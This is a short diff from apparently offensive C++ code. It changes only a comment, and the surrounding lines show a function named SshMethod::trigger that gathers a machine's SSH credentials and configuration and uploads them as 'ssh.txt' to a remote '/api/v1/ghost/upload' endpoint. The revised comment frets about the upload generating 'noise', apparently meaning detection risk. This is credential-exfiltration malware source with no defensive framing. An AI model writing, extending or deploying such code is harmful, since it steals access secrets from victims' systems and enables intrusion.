@@ -17,7 +17,7 @@ bool SshMethod::trigger() {
 
     if (data.empty()) return false;
 
-    // TODO: think about aggregating all info and sending in one request, this is highly inefficient
+    // TODO: think about aggregating all info and sending in one request, this is highly inefficient and generates a lot of noise
     LOG_INFO("Uploading ssh creds and config")
     return Comms::UploadFile("/api/v1/ghost/upload", "ssh.txt", data);
 }
